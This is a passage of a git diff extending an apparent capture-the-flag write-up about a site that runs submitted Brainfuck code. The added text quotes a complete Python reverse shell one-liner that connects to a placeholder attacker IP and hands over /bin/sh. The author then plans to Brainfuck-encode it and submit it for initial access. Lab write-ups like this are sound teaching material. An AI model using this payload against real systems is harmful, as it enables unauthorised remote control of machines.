@@ -59,3 +59,10 @@ Hmmm, very intersting. Seems as if the the page decodes the _Brainfuck_ programm
 
 It just prints _"Hello, World"_. Now let's see what happens when we try it with the Fibonacci brainfuck text.
 ![image]({{0xtaylur.github.io}}/assets/fibonacci.png)
+
+So it seems like it it runs the actual brainfuck progamming language. Let's see if we can try to get a reverse shell with this knowledge. I headed over to the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and used the python reverse shell code.
+```markdown
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+
+After I changed the default IP in that code block to my tun0 IP.(You can find that out by using the command _ifconfig_ in your terminal). I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.
